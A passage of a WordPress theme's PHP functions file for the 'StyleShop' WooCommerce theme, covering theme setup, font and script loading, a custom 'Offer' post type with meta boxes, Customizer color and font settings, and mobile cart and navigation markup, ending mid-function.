<?php

if ( ! isset( $content_width ) ) $content_width = 508;

add_action( 'after_setup_theme', 'et_setup_theme' );
if ( ! function_exists( 'et_setup_theme' ) ){
	function et_setup_theme(){
		global $themename, $shortname, $et_store_options_in_one_row, $default_colorscheme;
		$themename = 'StyleShop';
		$shortname = 'styleshop';
		$et_store_options_in_one_row = true;

		$default_colorscheme = "Default";

		$template_directory = get_template_directory();

		require_once( $template_directory . '/epanel/custom_functions.php' );

		require_once( $template_directory . '/includes/functions/comments.php' );

		require_once( $template_directory . '/includes/functions/sidebars.php' );

		load_theme_textdomain( 'StyleShop', $template_directory . '/lang' );

		require_once( $template_directory . '/epanel/core_functions.php' );

		require_once( $template_directory . '/epanel/post_thumbnails_styleshop.php' );

		include( $template_directory . '/includes/widgets.php' );

		register_nav_menus( array(
			'primary-menu' 		=> __( 'Primary Menu', 'StyleShop' ),
			'secondary-menu'	=> __( 'Secondary Menu', 'StyleShop' )
		) );

		add_theme_support( 'woocommerce' );

		add_action( 'body_class', 'et_add_woocommerce_class_to_homepage' );

		add_action( 'init', 'et_styleshop_register_offer_posttype', 0 );

		add_action( 'wp_enqueue_scripts', 'et_styleshop_load_scripts_styles' );

		add_action( 'wp_head', 'et_add_viewport_meta' );

		add_action( 'wp_head', 'et_add_background_image' );

		add_action( 'pre_get_posts', 'et_home_posts_query' );

		add_action( 'et_epanel_changing_options', 'et_delete_featured_ids_cache' );
		add_action( 'delete_post', 'et_delete_featured_ids_cache' );
		add_action( 'save_post', 'et_delete_featured_ids_cache' );

		add_filter( 'wp_page_menu_args', 'et_add_home_link' );

		add_filter( 'et_get_additional_color_scheme', 'et_remove_additional_stylesheet' );

		add_action( 'wp_enqueue_scripts', 'et_add_responsive_shortcodes_css', 11 );

		// don't display the empty title bar if the widget title is not set
		remove_filter( 'widget_title', 'et_widget_force_title' );

		add_action( 'et_header_top', 'et_add_mobile_sidebar' );

		add_action( 'et_top_navigation', 'et_add_shop_cart' );

		// homepage is a full width page, make sure it uses et_fullwidth_view class ( instead of et_includes_sidebar )
		add_filter( 'et_fullwidth_view_body_class', 'et_homepage_change_body_class' );

		remove_action( 'woocommerce_single_product_summary', 'woocommerce_template_single_add_to_cart', 30 );
		add_action( 'woocommerce_single_product_summary', 'woocommerce_template_single_add_to_cart', 15 );

		remove_action( 'woocommerce_before_single_product_summary', 'woocommerce_show_product_sale_flash', 10 );
		add_action( 'woocommerce_product_thumbnails', 'woocommerce_show_product_sale_flash', 10 );
	}
}

function et_add_home_link( $args ) {
	// add Home link to the custom menu WP-Admin page
	$args['show_home'] = true;
	return $args;
}

function et_styleshop_load_scripts_styles(){
	$template_dir = get_template_directory_uri();
	$protocol = is_ssl() ? 'https' : 'http';

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) wp_enqueue_script( 'comment-reply' );

	if ( 'off' !== _x( 'on', 'Open Sans font: on or off', 'StyleShop' ) ) {
		$subsets = 'latin,latin-ext';

		$subset = _x( 'no-subset', 'Open Sans font: add new subset (greek, cyrillic, vietnamese)', 'StyleShop' );

		if ( 'cyrillic' == $subset )
			$subsets .= ',cyrillic,cyrillic-ext';
		elseif ( 'greek' == $subset )
			$subsets .= ',greek,greek-ext';
		elseif ( 'vietnamese' == $subset )
			$subsets .= ',vietnamese';

		$query_args = array(
			'family' => 'Open+Sans:300italic,700italic,800italic,400,300,700,800',
			'subset' => $subsets
		);

		wp_enqueue_style( 'styleshop-fonts-open-sans', add_query_arg( $query_args, "$protocol://fonts.googleapis.com/css" ), array(), null );
	}

	if ( 'off' !== _x( 'on', 'Goudy Bookletter 1911 font: on or off', 'StyleShop' ) )
		wp_enqueue_style( 'styleshop-fonts-goudy-bookletter', "$protocol://fonts.googleapis.com/css?family=Goudy+Bookletter+1911", array(), null );

	wp_enqueue_script( 'superfish', $template_dir . '/js/superfish.js', array( 'jquery' ), '1.0', true );
	wp_enqueue_script( 'custom_script', $template_dir . '/js/custom.js', array( 'jquery' ), '1.0', true );
	wp_localize_script( 'custom_script', 'et_custom', array( 'template_dir_uri' => get_template_directory_uri(), 'mobile_nav_text' => esc_html__( 'Navigation Menu', 'StyleShop' ) ) );

	$et_gf_enqueue_fonts = array();
	$et_gf_heading_font = sanitize_text_field( et_get_option( 'heading_font', 'none' ) );
	$et_gf_body_font = sanitize_text_field( et_get_option( 'body_font', 'none' ) );

	if ( 'none' != $et_gf_heading_font ) $et_gf_enqueue_fonts[] = $et_gf_heading_font;
	if ( 'none' != $et_gf_body_font ) $et_gf_enqueue_fonts[] = $et_gf_body_font;

	if ( ! empty( $et_gf_enqueue_fonts ) ) et_gf_enqueue_fonts( $et_gf_enqueue_fonts );

	/*
	 * Loads the main stylesheet.
	 */
	wp_enqueue_style( 'styleshop-style', get_stylesheet_uri() );
}

/**
 * Filters the main query on homepage
 */
function et_home_posts_query( $query = false ) {
	/* Don't proceed if it's not homepage or the main query */
	if ( ! is_home() || ! is_a( $query, 'WP_Query' ) || ! $query->is_main_query() ) return;

	/* Set the amount of posts per page on homepage */
	$query->set( 'posts_per_page', (int) et_get_option( 'styleshop_homepage_posts', '3' ) );

	if ( ! class_exists( 'woocommerce' ) || 'on' == et_get_option( 'styleshop_blog_style', 'false' ) ) {
		/* Exclude categories set in ePanel */
		$exclude_categories = et_get_option( 'styleshop_exlcats_recent', false, 'category' );

		if ( $exclude_categories ) $query->set( 'category__not_in', array_map( 'intval', $exclude_categories ) );
	} elseif ( 'false' == et_get_option( 'styleshop_blog_style', 'false' ) ) {
		/* Display WooCommerce products on homepage */
		$query->set( 'post_type', 'product' );
		$query->set( 'meta_query', array(
				array( 'key' => '_visibility', 'value' => array( 'catalog', 'visible' ),'compare' => 'IN' )
			)
		);

		$exclude_categories = et_get_option( 'styleshop_exlcats_recent_products', false );

		if ( $exclude_categories ) {
			$query->set( 'tax_query', array(
					array(
						'taxonomy' 	=> 'product_cat',
						'field' 	=> 'id',
						'operator'	=> 'NOT IN',
						'terms'		=> (array) array_map( 'intval', $exclude_categories )
					)
				)
			);
		}
	}

	/* Exclude slider posts, if the slider is activated, pages are not featured and posts duplication is disabled in ePanel  */
	if ( 'on' == et_get_option( 'styleshop_featured', 'on' ) && 'false' == et_get_option( 'styleshop_use_pages', 'false' ) && 'false' == et_get_option( 'styleshop_duplicate', 'on' ) )
		$query->set( 'post__not_in', et_get_featured_posts_ids() );
}

function et_add_mobile_navigation(){
	echo '<div id="et_mobile_nav_menu">' . '<a href="#" class="mobile_nav closed">' . esc_html__( 'Navigation Menu', 'StyleShop' ) . '<span></span></a>' . '</div>';
}

function et_add_viewport_meta(){
	echo '<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />';
}

function et_remove_additional_stylesheet( $stylesheet ){
	global $default_colorscheme;
	return $default_colorscheme;
}

/**
 * Gets featured posts IDs from transient, if the transient doesn't exist - runs the query and stores IDs
 */
function et_get_featured_posts_ids(){
	if ( false === ( $et_featured_post_ids = get_transient( 'et_featured_post_ids' ) ) ) {
		$featured_query = new WP_Query( apply_filters( 'et_featured_post_args', array(
			'posts_per_page'	=> (int) et_get_option( 'styleshop_featured_num' ),
			'cat'				=> (int) get_catId( et_get_option( 'styleshop_feat_posts_cat' ) )
		) ) );

		if ( $featured_query->have_posts() ) {
			while ( $featured_query->have_posts() ) {
				$featured_query->the_post();

				$et_featured_post_ids[] = get_the_ID();
			}

			set_transient( 'et_featured_post_ids', $et_featured_post_ids );
		}

		wp_reset_postdata();
	}

	return $et_featured_post_ids;
}

/**
 * Deletes featured posts IDs transient, when the user saves, resets ePanel settings, creates or moves posts to trash in WP-Admin
 */
function et_delete_featured_ids_cache(){
	if ( false !== get_transient( 'et_featured_post_ids' ) ) delete_transient( 'et_featured_post_ids' );
}

// flush permalinks on theme activation
add_action( 'after_switch_theme', 'et_rewrite_flush' );
function et_rewrite_flush() {
    flush_rewrite_rules();
}

if ( ! function_exists( 'et_list_pings' ) ){
	function et_list_pings($comment, $args, $depth) {
		$GLOBALS['comment'] = $comment; ?>
		<li id="comment-<?php comment_ID(); ?>"><?php comment_author_link(); ?> - <?php comment_excerpt(); ?>
	<?php }
}

if ( ! function_exists( 'et_get_the_author_posts_link' ) ){
	function et_get_the_author_posts_link(){
		global $authordata, $themename;

		$link = sprintf(
			'<a href="%1$s" title="%2$s" rel="author">%3$s</a>',
			get_author_posts_url( $authordata->ID, $authordata->user_nicename ),
			esc_attr( sprintf( __( 'Posts by %s', $themename ), get_the_author() ) ),
			get_the_author()
		);
		return apply_filters( 'the_author_posts_link', $link );
	}
}

if ( ! function_exists( 'et_get_comments_popup_link' ) ){
	function et_get_comments_popup_link( $zero = false, $one = false, $more = false ){
		global $themename;

		$id = get_the_ID();
		$number = get_comments_number( $id );

		if ( 0 == $number && !comments_open() && !pings_open() ) return;

		if ( $number > 1 )
			$output = str_replace('%', number_format_i18n($number), ( false === $more ) ? __('% Comments', $themename) : $more);
		elseif ( $number == 0 )
			$output = ( false === $zero ) ? __('No Comments',$themename) : $zero;
		else // must be one
			$output = ( false === $one ) ? __('1 Comment', $themename) : $one;

		return '<span class="comments-number">' . '<a href="' . esc_url( get_permalink() . '#respond' ) . '">' . apply_filters('comments_number', $output, $number) . '</a>' . '</span>';
	}
}

if ( ! function_exists( 'et_postinfo_meta' ) ){
	function et_postinfo_meta( $postinfo, $date_format, $comment_zero, $comment_one, $comment_more ){
		global $themename;

		$postinfo_meta = '';

		if ( in_array( 'author', $postinfo ) ){
			$postinfo_meta .= ' ' . esc_html__('by',$themename) . ' ' . et_get_the_author_posts_link();
		}

		if ( in_array( 'date', $postinfo ) )
			$postinfo_meta .= ' ' . esc_html__('on',$themename) . ' ' . get_the_time( $date_format );

		if ( in_array( 'categories', $postinfo ) )
			$postinfo_meta .= ' ' . esc_html__('in',$themename) . ' ' . get_the_category_list(', ');

		if ( in_array( 'comments', $postinfo ) )
			$postinfo_meta .= ' | ' . et_get_comments_popup_link( $comment_zero, $comment_one, $comment_more );

		if ( '' != $postinfo_meta ) $postinfo_meta = __('Posted',$themename) . ' ' . $postinfo_meta;

		echo $postinfo_meta;
	}
}

function et_styleshop_register_offer_posttype() {
	$labels = array(
		'name' 					=> _x( 'Offers', 'post type general name', 'StyleShop' ),
		'singular_name' 		=> _x( 'Offer', 'post type singular name', 'StyleShop' ),
		'add_new' 				=> _x( 'Add New', 'Offer item', 'StyleShop' ),
		'add_new_item'			=> __( 'Add New Offer', 'StyleShop' ),
		'edit_item' 			=> __( 'Edit Offer', 'StyleShop' ),
		'new_item' 				=> __( 'New Offer', 'StyleShop' ),
		'all_items' 			=> __( 'All Offers', 'StyleShop' ),
		'view_item' 			=> __( 'View Offer', 'StyleShop' ),
		'search_items' 			=> __( 'Search Offers', 'StyleShop' ),
		'not_found' 			=> __( 'Nothing found', 'StyleShop' ),
		'not_found_in_trash' 	=> __( 'Nothing found in Trash', 'StyleShop' ),
		'parent_item_colon' 	=> ''
	);

	$args = array(
		'labels' 				=> $labels,
		'public' 				=> true,
		'publicly_queryable' 	=> true,
		'show_ui' 				=> true,
		'can_export'			=> true,
		'show_in_nav_menus'		=> false,
		'query_var' 			=> true,
		'has_archive' 			=> false,
		'rewrite' 				=> apply_filters( 'et_offer_posttype_rewrite_args', array( 'slug' => 'offer', 'with_front' => false ) ),
		'capability_type' 		=> 'post',
		'hierarchical' 			=> false,
		'menu_position' 		=> null,
		'supports' 				=> array( 'title', 'thumbnail', 'excerpt', 'comments', 'revisions', 'custom-fields' )
	);

	register_post_type( 'offer' , apply_filters( 'et_offer_posttype_args', $args ) );
}

//add filter to ensure the text Offer is displayed when user updates an offer
add_filter( 'post_updated_messages', 'et_custom_post_type_updated_message' );
function et_custom_post_type_updated_message( $messages ) {
	global $post, $post_id;

	$messages['offer'] = array(
		0 => '', // Unused. Messages start at index 1.
		1 => sprintf( __( 'Offer updated. <a href="%s">View Offer</a>', 'StyleShop' ), esc_url( get_permalink( $post_id ) ) ),
		2 => __( 'Custom field updated.', 'StyleShop' ),
		3 => __( 'Custom field deleted.', 'StyleShop' ),
		4 => __( 'Offer updated.', 'StyleShop' ),
		/* translators: %s: date and time of the revision */
		5 => isset( $_GET['revision'] ) ? sprintf( __( 'Offer restored to revision from %s', 'StyleShop' ), wp_post_revision_title( (int) $_GET['revision'], false ) ) : false,
		6 => sprintf( __( 'Offer published. <a href="%s">View Offer</a>', 'StyleShop' ), esc_url( get_permalink( $post_id ) ) ),
		7 => __( 'Offer saved.', 'StyleShop' ),
		8 => sprintf( __( 'Offer submitted. <a target="_blank" href="%s">Preview Offer</a>', 'StyleShop' ), esc_url( add_query_arg( 'preview', 'true', get_permalink( $post_id ) ) ) ),
		9 => sprintf( __( 'Offer scheduled for: <strong>%1$s</strong>. <a target="_blank" href="%2$s">Preview Offer</a>', 'StyleShop' ),
		  // translators: Publish box date format, see http://php.net/date
		  date_i18n( __( 'M j, Y @ G:i', 'StyleShop' ), strtotime( $post->post_date ) ), esc_url( get_permalink( $post_id ) ) ),
		10 => sprintf( __( 'Offer draft updated. <a target="_blank" href="%s">Preview testimonial</a>', 'StyleShop' ), esc_url( add_query_arg( 'preview', 'true', get_permalink( $post_id ) ) ) )
	);

	return $messages;
}

add_action( 'add_meta_boxes', 'et_event_posttype_meta_box' );
function et_event_posttype_meta_box() {
	add_meta_box( 'et_settings_meta_box', __( 'ET Settings', 'StyleShop' ), 'et_offer_settings_meta_box', 'offer', 'normal', 'high' );
	add_meta_box( 'et_settings_meta_box', __( 'ET Settings', 'StyleShop' ), 'et_post_settings_meta_box', 'post', 'normal', 'high' );
	add_meta_box( 'et_settings_meta_box', __( 'ET Settings', 'StyleShop' ), 'et_post_settings_meta_box', 'page', 'normal', 'high' );
	add_meta_box( 'et_settings_meta_box', __( 'ET Settings', 'StyleShop' ), 'et_post_settings_meta_box', 'product', 'normal', 'high' );
}

function et_post_settings_meta_box() {
	$post_id = get_the_ID();
	wp_nonce_field( basename( __FILE__ ), 'et_settings_nonce' );
?>
	<p><?php esc_html_e( 'If this post is displayed in the featured slider on homepage, you can set options for it here.', 'StyleShop' ); ?></p>

	<p>
		<label for="et_slide_title" style="min-width: 150px; display: inline-block;"><?php esc_html_e( 'Slide Title', 'StyleShop' ); ?>: </label>
		<input type="text" name="et_slide_title" id="et_slide_title" class="regular-text" value="<?php echo esc_attr( get_post_meta( $post_id, '_et_slide_title', true ) ); ?>" />
	</p>

	<p>
		<label for="et_slide_description" style="min-width: 150px; display: inline-block;"><?php esc_html_e( 'Slide Description', 'StyleShop' ); ?>: </label>
		<input type="text" name="et_slide_description" id="et_slide_description" class="regular-text" value="<?php echo esc_attr( get_post_meta( $post_id, '_et_slide_description', true ) ); ?>" />
	</p>

	<p>
		<label for="et_button_text" style="min-width: 150px; display: inline-block;"><?php esc_html_e( 'Read More Button Text', 'StyleShop' ); ?>: </label>
		<input type="text" name="et_button_text" id="et_button_text" class="regular-text" value="<?php echo esc_attr( get_post_meta( $post_id, '_et_button_text', true ) ); ?>" />
	</p>

	<p>
		<label for="et_slide_more_link" style="min-width: 150px; display: inline-block;"><?php esc_html_e( 'Read More Custom Link', 'StyleShop' ); ?>: </label>
		<input type="text" name="et_slide_more_link" id="et_slide_more_link" class="regular-text" value="<?php echo esc_attr( get_post_meta( $post_id, '_et_slide_more_link', true ) ); ?>" />

		<br/>
		<small><?php esc_html_e( 'here you can provide a custom url, that will be used for the slide', 'StyleShop' ); ?></small>
	</p>
<?php
}

function et_offer_settings_meta_box() {
	$post_id = get_the_ID();
	wp_nonce_field( basename( __FILE__ ), 'et_settings_nonce' );
?>
	<p>
		<label for="et_offer_button_text" style="min-width: 150px; display: inline-block;"><?php esc_html_e( 'Button Text', 'StyleShop' ); ?>: </label>
		<input type="text" name="et_offer_button_text" id="et_offer_button_text" class="regular-text" value="<?php echo esc_attr( get_post_meta( $post_id, '_et_offer_button_text', true ) ); ?>" />
	</p>

	<p>
		<label for="et_offer_custom_link" style="min-width: 150px; display: inline-block;"><?php esc_html_e( 'Custom Link', 'StyleShop' ); ?>: </label>
		<input type="text" name="et_offer_custom_link" id="et_offer_custom_link" class="regular-text" value="<?php echo esc_attr( get_post_meta( $post_id, '_et_offer_custom_link', true ) ); ?>" />
	</p>
<?php
}

add_action( 'save_post', 'et_metabox_settings_save_details', 10, 2 );
function et_metabox_settings_save_details( $post_id, $post ){
	global $pagenow;

	if ( 'post.php' != $pagenow ) return $post_id;

	if ( defined( 'DOING_AUTOSAVE' ) && DOING_AUTOSAVE )
		return $post_id;

	$post_type = get_post_type_object( $post->post_type );
	if ( ! current_user_can( $post_type->cap->edit_post, $post_id ) )
		return $post_id;

	if ( !isset( $_POST['et_settings_nonce'] ) || ! wp_verify_nonce( $_POST['et_settings_nonce'], basename( __FILE__ ) ) )
        return $post_id;

	if ( in_array( $_POST['post_type'], array( 'post', 'page', 'product' ) ) ) {
		if ( isset( $_POST['et_slide_title'] ) )
			update_post_meta( $post_id, '_et_slide_title', sanitize_text_field( $_POST['et_slide_title'] ) );
		else
			delete_post_meta( $post_id, '_et_slide_title' );

		if ( isset( $_POST['et_slide_description'] ) )
			update_post_meta( $post_id, '_et_slide_description', sanitize_text_field( $_POST['et_slide_description'] ) );
		else
			delete_post_meta( $post_id, '_et_slide_description' );

		if ( isset( $_POST['et_button_text'] ) )
			update_post_meta( $post_id, '_et_button_text', sanitize_text_field( $_POST['et_button_text'] ) );
		else
			delete_post_meta( $post_id, '_et_button_text' );

		if ( isset( $_POST['et_slide_more_link'] ) )
			update_post_meta( $post_id, '_et_slide_more_link', esc_url_raw( $_POST['et_slide_more_link'] ) );
		else
			delete_post_meta( $post_id, '_et_slide_more_link' );
	} else if ( 'offer' == $_POST['post_type'] ) {
		if ( isset( $_POST['et_offer_button_text'] ) )
			update_post_meta( $post_id, '_et_offer_button_text', sanitize_text_field( $_POST['et_offer_button_text'] ) );
		else
			delete_post_meta( $post_id, '_et_offer_button_text' );

		if ( isset( $_POST['et_offer_custom_link'] ) )
			update_post_meta( $post_id, '_et_offer_custom_link', esc_url_raw( $_POST['et_offer_custom_link'] ) );
		else
			delete_post_meta( $post_id, '_et_offer_custom_link' );
	}
}

if ( function_exists( 'get_custom_header' ) ) {
	// compatibility with versions of WordPress prior to 3.4

	add_action( 'customize_register', 'et_styleshop_customize_register' );
	function et_styleshop_customize_register( $wp_customize ) {
		$google_fonts = et_get_google_fonts();

		$font_choices = array();
		$font_choices['none'] = 'Default Theme Font';
		foreach ( $google_fonts as $google_font_name => $google_font_properties ) {
			$font_choices[ $google_font_name ] = $google_font_name;
		}

		$wp_customize->remove_section( 'title_tagline' );
		$wp_customize->remove_section( 'background_image' );

		$wp_customize->add_section( 'et_google_fonts' , array(
			'title'		=> __( 'Fonts', 'StyleShop' ),
			'priority'	=> 50,
		) );

		$wp_customize->add_section( 'et_color_schemes' , array(
			'title'       => __( 'Schemes', 'StyleShop' ),
			'priority'    => 60,
			'description' => __( 'Note: Color settings set above should be applied to the Default color scheme.', 'StyleShop' ),
		) );

		$wp_customize->add_setting( 'et_styleshop[link_color]', array(
			'default'		=> '#aed23f',
			'type'			=> 'option',
			'capability'	=> 'edit_theme_options',
			'transport'		=> 'postMessage'
		) );

		$wp_customize->add_control( new WP_Customize_Color_Control( $wp_customize, 'et_styleshop[link_color]', array(
			'label'		=> __( 'Link Color', 'StyleShop' ),
			'section'	=> 'colors',
			'settings'	=> 'et_styleshop[link_color]',
		) ) );

		$wp_customize->add_setting( 'et_styleshop[font_color]', array(
			'default'		=> '#555555',
			'type'			=> 'option',
			'capability'	=> 'edit_theme_options',
			'transport'		=> 'postMessage'
		) );

		$wp_customize->add_control( new WP_Customize_Color_Control( $wp_customize, 'et_styleshop[font_color]', array(
			'label'		=> __( 'Main Font Color', 'StyleShop' ),
			'section'	=> 'colors',
			'settings'	=> 'et_styleshop[font_color]',
		) ) );

		$wp_customize->add_setting( 'et_styleshop[headings_color]', array(
			'default'		=> '#111111',
			'type'			=> 'option',
			'capability'	=> 'edit_theme_options',
			'transport'		=> 'postMessage'
		) );

		$wp_customize->add_control( new WP_Customize_Color_Control( $wp_customize, 'et_styleshop[headings_color]', array(
			'label'		=> __( 'Headings Color', 'StyleShop' ),
			'section'	=> 'colors',
			'settings'	=> 'et_styleshop[headings_color]',
		) ) );

		$wp_customize->add_setting( 'et_styleshop[top_menu_bar]', array(
			'default'		=> '#222323',
			'type'			=> 'option',
			'capability'	=> 'edit_theme_options',
			'transport'		=> 'postMessage'
		) );

		$wp_customize->add_control( new WP_Customize_Color_Control( $wp_customize, 'et_styleshop[top_menu_bar]', array(
			'label'		=> __( 'Top Menu Bar Background Color', 'StyleShop' ),
			'section'	=> 'colors',
			'settings'	=> 'et_styleshop[top_menu_bar]',
		) ) );

		$wp_customize->add_setting( 'et_styleshop[menu_link_color]', array(
			'default'		=> '#ffffff',
			'type'			=> 'option',
			'capability'	=> 'edit_theme_options',
			'transport'		=> 'postMessage'
		) );

		$wp_customize->add_control( new WP_Customize_Color_Control( $wp_customize, 'et_styleshop[menu_link_color]', array(
			'label'		=> __( 'Menu Links Color', 'StyleShop' ),
			'section'	=> 'colors',
			'settings'	=> 'et_styleshop[menu_link_color]',
		) ) );

		$wp_customize->add_setting( 'et_styleshop[highlight_color]', array(
			'default'		=> '#c3e54b',
			'type'			=> 'option',
			'capability'	=> 'edit_theme_options',
			'transport'		=> 'postMessage'
		) );

		$wp_customize->add_control( new WP_Customize_Color_Control( $wp_customize, 'et_styleshop[highlight_color]', array(
			'label'		=> __( 'Menu Highlight Color', 'StyleShop' ),
			'section'	=> 'colors',
			'settings'	=> 'et_styleshop[highlight_color]',
		) ) );

		$wp_customize->add_setting( 'et_styleshop[main_footer]', array(
			'default'		=> '#222323',
			'type'			=> 'option',
			'capability'	=> 'edit_theme_options',
			'transport'		=> 'postMessage'
		) );

		$wp_customize->add_control( new WP_Customize_Color_Control( $wp_customize, 'et_styleshop[main_footer]', array(
			'label'		=> __( 'Footer Area Background Color', 'StyleShop' ),
			'section'	=> 'colors',
			'settings'	=> 'et_styleshop[main_footer]',
		) ) );

		$wp_customize->add_setting( 'et_styleshop[heading_font]', array(
			'default'		=> 'none',
			'type'			=> 'option',
			'capability'	=> 'edit_theme_options'
		) );

		$wp_customize->add_control( 'et_styleshop[heading_font]', array(
			'label'		=> __( 'Header Font', 'StyleShop' ),
			'section'	=> 'et_google_fonts',
			'settings'	=> 'et_styleshop[heading_font]',
			'type'		=> 'select',
			'choices'	=> $font_choices
		) );

		$wp_customize->add_setting( 'et_styleshop[body_font]', array(
			'default'		=> 'none',
			'type'			=> 'option',
			'capability'	=> 'edit_theme_options'
		) );

		$wp_customize->add_control( 'et_styleshop[body_font]', array(
			'label'		=> __( 'Body Font', 'StyleShop' ),
			'section'	=> 'et_google_fonts',
			'settings'	=> 'et_styleshop[body_font]',
			'type'		=> 'select',
			'choices'	=> $font_choices
		) );

		$wp_customize->add_setting( 'et_styleshop[color_schemes]', array(
			'default'		=> 'none',
			'type'			=> 'option',
			'capability'	=> 'edit_theme_options',
			'transport'		=> 'postMessage'
		) );

		$wp_customize->add_control( 'et_styleshop[color_schemes]', array(
			'label'		=> __( 'Color Schemes', 'StyleShop' ),
			'section'	=> 'et_color_schemes',
			'settings'	=> 'et_styleshop[color_schemes]',
			'type'		=> 'select',
			'choices'	=> array(
				'none'   => __( 'Default', 'StyleShop' ),
				'blue'   => __( 'Blue', 'StyleShop' ),
				'green'  => __( 'Green', 'StyleShop' ),
				'purple' => __( 'Purple', 'StyleShop' ),
				'red'    => __( 'Red', 'StyleShop' ),
			),
		) );
	}

	add_action( 'customize_preview_init', 'et_styleshop_customize_preview_js' );
	function et_styleshop_customize_preview_js() {
		wp_enqueue_script( 'styleshop-customizer', get_template_directory_uri() . '/js/theme-customizer.js', array( 'customize-preview' ), false, true );
	}

	add_action( 'wp_head', 'et_styleshop_add_customizer_css' );
	add_action( 'customize_controls_print_styles', 'et_styleshop_add_customizer_css' );
	function et_styleshop_add_customizer_css(){ ?>
		<style>
			a { color: <?php echo esc_html( et_get_option( 'link_color', '#aed23f' ) ); ?>; }
			body, #main-footer { color: <?php echo esc_html( et_get_option( 'font_color', '#555555' ) ); ?>; }
			h1, h2, h3, h4, h5, h6, #special-offers h1, .home-area h1, .widget h4.widgettitle, .entry h2.title a, h1.title, #comments, #reply-title { color: <?php echo esc_html( et_get_option( 'headings_color', '#111111' ) ); ?>; }

			#top-categories, .nav ul { background-color: <?php echo esc_html( et_get_option( 'top_menu_bar', '#222323' ) ); ?> }
			#top-categories a { color: <?php echo esc_html( et_get_option( 'menu_link_color', '#ffffff' ) ); ?> }

			#main-footer { background-color: <?php echo esc_html( et_get_option( 'main_footer', '#222323' ) ); ?> }
			#top-categories a .menu-highlight, #mobile_menu .menu-highlight { background: <?php echo esc_html( et_get_option( 'highlight_color', '#c3e54b' ) ); ?>; }

		<?php
			$et_gf_heading_font = sanitize_text_field( et_get_option( 'heading_font', 'none' ) );
			$et_gf_body_font = sanitize_text_field( et_get_option( 'body_font', 'none' ) );

			if ( 'none' != $et_gf_heading_font || 'none' != $et_gf_body_font ) :

				if ( 'none' != $et_gf_heading_font )
					et_gf_attach_font( $et_gf_heading_font, 'h1, h2, h3, h4, h5, h6, #offers li h2, .et-slide .description header h1, .more-button' );

				if ( 'none' != $et_gf_body_font )
					et_gf_attach_font( $et_gf_body_font, 'body' );

			endif;
		?>
		</style>
	<?php }

	/*
	 * Adds color scheme class to the body tag
	 */
	add_filter( 'body_class', 'et_customizer_color_scheme_class' );
	function et_customizer_color_scheme_class( $body_class ) {
		$color_scheme        = et_get_option( 'color_schemes', 'none' );
		$color_scheme_prefix = 'et_color_scheme_';

		if ( 'none' !== $color_scheme ) $body_class[] = $color_scheme_prefix . $color_scheme;

		return $body_class;
	}

	add_action( 'customize_controls_print_footer_scripts', 'et_load_google_fonts_scripts' );
	function et_load_google_fonts_scripts() {
		wp_enqueue_script( 'et_google_fonts', get_template_directory_uri() . '/epanel/google-fonts/et_google_fonts.js', array( 'jquery' ), '1.0', true );
	}

	add_action( 'customize_controls_print_styles', 'et_load_google_fonts_styles' );
	function et_load_google_fonts_styles() {
		wp_enqueue_style( 'et_google_fonts_style', get_template_directory_uri() . '/epanel/google-fonts/et_google_fonts.css', array(), null );
	}
}

function et_add_mobile_sidebar(){ ?>
	<div id="mobile-sidebar">
		<span id="toggle-sidebar"></span>

		<div class="mobile-block mobile-search">
			<div id="et-mobile-search">
				<form method="get" action="<?php echo esc_url( home_url() ); ?>">
					<input type="text" value="<?php esc_attr_e( 'Search this site...', 'StyleShop' ); ?>" name="s" class="search_input_text" />

					<button type="submit" class="mobile-search-button"><?php esc_html_e( 'Search', 'StyleShop' ); ?></button>
				</form>
			</div> <!-- .et-mobile-search -->
		</div> <!-- .mobile-block -->

<?php
if ( class_exists( 'woocommerce' ) ) :
	global $woocommerce;
	$items_number = (int) sizeof( $woocommerce->cart->cart_contents );
?>

		<div class="mobile-block mobile-cart">
			<a href="<?php echo esc_url( $woocommerce->cart->get_cart_url() ); ?>" class="et-cart"><?php printf( _n( '1 Item', '%d Items', $items_number, 'StyleShop' ), $items_number ); ?><span><?php esc_html_e( 'Checkout', 'StyleShop' ); ?></span></a>
		</div> <!-- .mobile-block -->

<?php endif; ?>

		<div class="mobile-block mobile-categories">
			<a href="#"><?php esc_html_e( 'Categories', 'StyleShop' ); ?></a>
		</div> <!-- .mobile-block -->

		<div class="mobile-block mobile-pages">
			<a href="#"><?php esc_html_e( 'Pages', 'StyleShop' ); ?></a>
		</div> <!-- .mobile-block -->
	</div> <!-- #mobile-sidebar -->
<?php
}

function et_add_shop_cart(){
	if ( ! class_exists( 'woocommerce' ) || 'false' == et_get_option( 'styleshop_show_checkout_button', 'on' ) ) return;
	global $woocommerce;
	$items_number = (int) sizeof( $woocommerce->cart->cart_contents );
?>
	<a href="<?php echo esc_url( $woocommerce->cart->get_cart_url() ); ?>" class="et-cart"><?php printf( _n( '1 Item', '%d Items', $items_number, 'StyleShop' ), $items_number ); ?></a>
<?php
}

/**
 * Homepage should display at full width by default
 */
function et_homepage_change_body_class( $class ){
	if ( is_home() ) $class = 'et_fullwidth_view';
	return $class;
}

/**
 * Overrides the plugin function to modify breadcrumbs default settings
 */
function woocommerce_breadcrumb( $args = array() ) {
	$defaults = array(
		'delimiter'  => ' <span class="raquo">&raquo;</span> ',
		'wrap_before'  => '<div id="breadcrumbs" itemprop="breadcrumb">',
		'wrap_after' => '<span class="raquo">&raquo;</span></div>',
		'before'   => '',
		'after'   => '',
		'home'    => null
	);

	$args = wp_parse_args( $args, $defaults  );

	woocommerce_get_template( 'shop/breadcrumb.php', $args );
}

/**
 * Gets all on sale product IDs, stores it in the transient
 * Note: the code is taken from the onsale widget
 */
function et_woocommerce_get_product_on_sale_ids(){
	if ( false === ( $product_ids_on_sale = get_transient( 'wc_products_onsale' ) ) ) {
		$meta_query = array();

	    $meta_query[] = array(
	    	'key' => '_sale_price',
	        'value' 	=> 0,
			'compare' 	=> '>',
			'type'		=> 'NUMERIC'
	    );

		$on_sale = get_posts(array(
			'post_type' 		=> array('product', 'product_variation'),
			'posts_per_page' 	=> -1,
			'post_status' 		=> 'publish',
			'meta_query' 		=> $meta_query,
			'fields' 			=> 'id=>parent'
		));

		$product_ids 	= array_keys( $on_sale );
		$parent_ids		= array_values( $on_sale );

		// Check for scheduled sales which have not started
		foreach ( $product_ids as $key => $id )
			if ( get_post_meta( $id, '_sale_price_dates_from', true ) > current_time('timestamp') )
				unset( $product_ids[ $key ] );

		$product_ids_on_sale = array_unique( array_merge( $product_ids, $parent_ids ) );

